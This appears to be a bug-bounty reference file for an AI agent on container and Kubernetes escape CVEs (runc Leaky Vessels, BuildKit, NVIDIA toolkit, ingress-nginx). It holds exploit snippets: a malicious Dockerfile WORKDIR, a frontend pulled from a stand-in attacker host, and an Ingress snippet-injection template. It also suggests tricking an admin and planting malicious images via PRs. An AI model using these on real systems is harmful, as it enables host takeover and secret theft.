---
name: container-runtime-escape
description: container-runtime-escape reference material.
---

# RCE Reference: Container Runtime & Admission-Controller Escape

Part of `skills/hunt-rce/SKILL.md`. Read this ONLY when the target is a container/Kubernetes environment -- shared CI build infrastructure, multi-tenant Kubernetes, GPU/NVIDIA nodes, or a pod-network-reachable ingress-nginx admission webhook.

---

### Sub-technique H — Container runtime escape (2024-2026 Modern Expansion)

```bash
# CVE-2024-21626 "Leaky Vessels" runc WORKDIR (Snyk Labs by Rory McNamara)
# Trigger condition: runc <= 1.1.11. CISA KEV-listed. CVSS 8.6.
# Build a malicious image whose WORKDIR is the leaked /sys/fs/cgroup fd:
cat <<'EOF' > Dockerfile
FROM alpine
WORKDIR /proc/self/fd/7
RUN echo "container can now see the host filesystem from this CWD"
EOF
# Or for runc exec attack: trick admin into calling
# `runc exec --cwd /proc/self/fd/7 <victim>` after symlinking the victim path.

# CVE-2024-23653 BuildKit GRPC SecurityMode (Snyk Labs)
# Trigger condition: BuildKit <= 0.12.4 with `# syntax=` line accepting
# untrusted frontend image. The malicious frontend calls Container.Start
# with elevated SecurityMode the buildkitd config doesn't restrict.
# syntax=evil.attacker.com/frontend:latest

# CVE-2024-0132 NVIDIA Container Toolkit TOCTOU (Wiz Research)
# Trigger condition: nvidia-container-toolkit <= 1.16.1, default config (CDI not used).
# Race-condition the OCI hook between security check and resource use to escape
# to host filesystem on GPU-equipped nodes.

# CVE-2025-1974 ingress-nginx admission controller (NVD-verified, CVSS 9.8)
# Trigger condition: ingress-nginx prior to 1.11.5 / 1.12.1, admission webhook
# reachable from attacker pod network (default in most clusters).
# Send a crafted Ingress object with an injected configuration snippet that
# the controller renders into nginx config and reloads, executing as the
# controller's ServiceAccount which by default has cluster-wide Secret read.
kubectl apply -f - <<'EOF'
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  annotations:
    nginx.ingress.kubernetes.io/server-snippet: |
      <crafted nginx Lua block — see Wiz / cluster-vendor advisory>
spec: {...}
EOF
```

### Container escape

The 2024 "Leaky Vessels" disclosure by Snyk Labs (Rory McNamara) reset the baseline. Every multi-tenant build infrastructure, every PR-triggered image build, every shared K8s node is now in scope for container-escape RCE.

- **CVE-2024-21626 (runc Leaky Vessels)** — CISA KEV, CVSS 8.6. Crafted `WORKDIR` to `/proc/self/fd/7/` (the leaked `/sys/fs/cgroup` fd) lets a malicious image escape. Variants: malicious image (`runc run`), tricked admin (`runc exec --cwd`), overwriting host binaries (attack 3a/3b).
- **CVE-2024-23653 (BuildKit GRPC SecurityMode)** — Snyk Labs. `# syntax=evil/frontend` in Dockerfile lets the parser image launch elevated-privilege containers without the `security.insecure` entitlement. Hits any CI building images from PR-supplied Dockerfiles.
- **CVE-2024-23651 / 23652 (BuildKit cache mount + ENV resolution)** — companion Leaky Vessels CVEs covering build-time mount path traversal and ENV resolution race.
- **CVE-2024-0132 (NVIDIA Container Toolkit TOCTOU)** — Wiz Research, CVSS High. Race condition between OCI hook security check and resource use. Affects all GPU-equipped clusters (ML training, inference, mining). Fixed in 1.16.2.
- **gVisor sandbox boundary** — gVisor eliminates the runc CVE class but its own boundary has been audited (no current critical CVE; the surface is the `runsc` interception layer for Linux syscalls; check release notes for sandbox escapes).

Hunting: any program with `Multi-tenant Kubernetes` / `shared CI` / `PR-builds-images` in scope is automatic. Drop a malicious image from a PR, watch for host filesystem access.
